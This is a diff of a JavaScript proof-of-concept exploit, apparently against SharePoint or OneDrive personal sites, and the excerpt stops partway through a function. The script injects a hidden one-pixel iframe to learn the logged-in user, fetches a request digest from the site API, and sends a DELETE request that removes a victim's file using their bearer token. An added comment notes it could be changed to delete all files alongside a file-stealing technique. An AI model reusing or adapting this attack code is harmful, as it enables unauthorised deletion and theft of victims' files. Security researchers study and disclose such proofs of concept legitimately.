@@ -1,18 +1,17 @@
 document.write("<iframe src='/' id='whoareu' border=0 width=1 height=1></iframe>");const myTimeout = setTimeout(whoareu, 2000);
 function whoareu() {
-  var theurl=document.getElementById('whoareu').contentWindow.location.href;
-  user = new URL(theurl).pathname.split('/')[2];
-var dgurl="/personal/"+user+"/_api/contextinfo";
-
-  var dg = getDigest(dgurl,user);
+	var theurl=document.getElementById('whoareu').contentWindow.location.href;
+	user = new URL(theurl).pathname.split('/')[2];
+	var dgurl="/personal/"+user+"/_api/contextinfo";
+	var dg = getDigest(dgurl,user);
 }
 
 function deleteIt(bearer){
-    
     var xmlhttp = new XMLHttpRequest();
 	// BEGIN NOTE
 	// THIS POC WAS USED TO DELETE A SPECIFIC file
 	// I did not want to run this recursive as it would have cause lots of problems
+	// If used with the concept for stealing files, you could delete all files if you made the changes
 	// END NOTE
 	xmlhttp.open("DELETE", "/_api/v2.1/drives/b!sm0rVuGWqkuZpy4Vd36PwJruo0OEm3tCtsysE4hMq3eBNlbLNaiYTIx1O3n9sedV/items/01CSUKDDRGWFYFG75S3ZD2ZYXV4ZMZJ5A5");
 	xmlhttp.onreadystatechange = function() {
